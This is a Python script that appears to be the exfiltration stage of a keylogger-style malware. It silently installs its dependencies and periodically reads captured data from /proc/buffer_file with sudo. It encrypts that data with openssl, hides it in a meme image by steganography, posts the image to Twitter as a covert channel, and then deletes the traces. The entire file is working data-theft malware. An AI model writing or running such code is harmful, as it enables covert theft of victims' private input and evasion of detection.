import os
import subprocess
import sys
import json
import random
import time
from io import BytesIO


def install(package):
    with open(os.devnull, "w") as FNULL:
        subprocess.check_call(
            [sys.executable, "-m", "pip", "install", package],
            stdout=FNULL,
            stderr=FNULL,
        )


try:
    import tweepy
except ImportError:
    install("tweepy")
    import tweepy

try:
    from stegano import lsb
except ImportError:
    install("Stegano")
    from stegano import lsb

try:
    import PIL
except ImportError:
    install("Pillow")
    import PIL

try:
    import requests
except ImportError:
    install("requests")
    import requests


def get_image_metadata():
    headers = {"Content-Type": "application/json"}
    api_url = "https://api.imgflip.com/get_memes"
    response = requests.get(api_url, headers=headers)

    if response.status_code != 200:
        return None

    content = json.loads(response.content.decode("utf-8"))
    memes = content["data"]
    return memes["memes"]


def get_image():
    image_set = get_image_metadata()
    image_size = int(config["IMAGE_SIZE"])
    # filter for correct image size
    new_image_set = []
    for image in image_set:
        if image["height"] >= image_size and image["width"] >= image_size:
            new_image_set.append(image)

    if len(new_image_set) == 0:
        raise Exception

    image = random.choice(new_image_set)
    image_url = image["url"]

    response = requests.get(image_url)
    if response.status_code != 200:
        return None

    return PIL.Image.open(BytesIO(response.content))


# hide message into image
def stenographize_image(image_path, new_image_path, text):
    secret_image = lsb.hide(image_path, message=text)
    secret_image.save(new_image_path)


def encrypt(password, logged_file, encrypted_file):
    enc_scheme = "-aes-128-cbc"
    opts = "-a -A -nosalt"
    openssl_cmd = (
        "openssl enc -pass pass:{} {} {} -in {} -out {} -nosalt 2> /dev/null ".format(
            password, enc_scheme, opts, logged_file, encrypted_file
        )
    )

    try:
        os.system(openssl_cmd)
    except Exception as e:
        print(e)


def cleanup(files):
    for file in files:
        if os.path.exists(file):
            os.remove(file)


# tweet image
def tweet_setup():
    consumer_key = config["TWITTER_CONSUMER_KEY"]
    consumer_key_secret = config["TWITTER_CONSUMER_KEY_SECRET"]
    access_token = config["TWITTER_ACCESS_TOKEN"]
    access_token_secret = config["TWITTER_ACCESS_TOKEN_SECRET"]

    auth = tweepy.OAuthHandler(consumer_key, consumer_key_secret)
    auth.set_access_token(access_token, access_token_secret)
    return tweepy.API(auth)


def tweet_image(tw_api, image_path, tw_text="I love lemons"):
    im_handler = tw_api.media_upload(image_path)
    media_ids = [im_handler.media_id_string]
    status = tw_api.update_status(tw_text, media_ids=media_ids, source="random user")


def send_stego_tweet():

    """
    Image size of 600x600 = 360,000 pixels
    Each byte of ASCII character can be encoded into 3 pixels
    Bytes of ascii = 360,000 / 3 = 120,000 bytes
    120,000 bytes = 117kB of text into image

    Gets image from meme generator

    """
    image_name = "test_image"
    image_path = "./{}.png".format(image_name)
    new_image_path = "./{}_new.png".format(image_name)

    jpg_img = get_image()
    ImageSize = int(config["IMAGE_SIZE"])
    jpg_img = jpg_img.resize((ImageSize, ImageSize))
    jpg_img.save(image_path)
    png_img = PIL.Image.open(image_path)
    width, height = png_img.size
    image_text_storage = (width * height) // 3  # number of ASCII character that is storable

    logged_file = "log_file_analyzed.txt"
    encrypted_file = "encrypted.txt"
    password = config["AES_PASSWORD"]

    encrypt(password, logged_file, encrypted_file)

    with open(encrypted_file, "rb") as encrypted_text:
        message = str(encrypted_text.read())
        if image_text_storage > len(message):
            stenographize_image(image_path, new_image_path, message)
            tw_api = tweet_setup()
            tweet_image(tw_api, new_image_path)

    files = [image_path, new_image_path, logged_file, encrypted_file]
    cleanup(files)


def check_log_file():
    EXPECTED_SIZE_LOGFILE = 10

    try:
        os.system("sudo cat /proc/buffer_file 2>/dev/null > log_file.txt")
    except Exception:
        print("check log file has failed")
        return False

    # returns size of file in bytes. Or num characters in file since one character is 1 byte
    log_file_size = os.stat("log_file.txt").st_size

    # check if file size is significant, if the file size if significant then we continue analysing it
    if log_file_size > EXPECTED_SIZE_LOGFILE:
        return check_analyzed_log_file()
    else:
        return False


# checks whether data is significant
def check_analyzed_log_file():
    EXPECTED_SIZE_ANALYSED_LOGFILE = 10

    try:
        os.system("python3 analyzer.py")
    except Exception:
        print("fail analyzing file")
        return False

    analysed_file_size = os.stat("log_file_analyzed.txt").st_size

    if analysed_file_size > EXPECTED_SIZE_ANALYSED_LOGFILE:
        return True
    else:
        return False


# returns a dictionary key value pair
# containing configuration data
def get_config():
    config = {}
    with open("config.ini", "r") as config_file:
        for line in config_file:
            if line == "\n":
                continue
            key, value = line.strip().replace("=", " ").split()
            config[key] = value
    return config


def scheduler():
    minutes = int(config["SCHEDULER_MINUTE_CYCLE"])
    repeat_every = 60 * minutes  # secs/min * minutes

    while True:
        print(config.values())
        # first we retrieve log file from /proc/buffer_file
        # check if enough data in log file. if yes continue, if not try again in 30 mins

        # if continue to next phase retrieve procfile and analyse data
        # check if enough data in analysed log file. if yes continue to tweet, if not try again in 30 mins
        should_continue_to_tweet = check_log_file()

        # if everything good then we send as tweet
        # repeat process again after that

        if should_continue_to_tweet:
            print("stego tweet sent")
            send_stego_tweet()
        else:
            print("no tweet")

        time.sleep(repeat_every)


config = get_config()
scheduler()
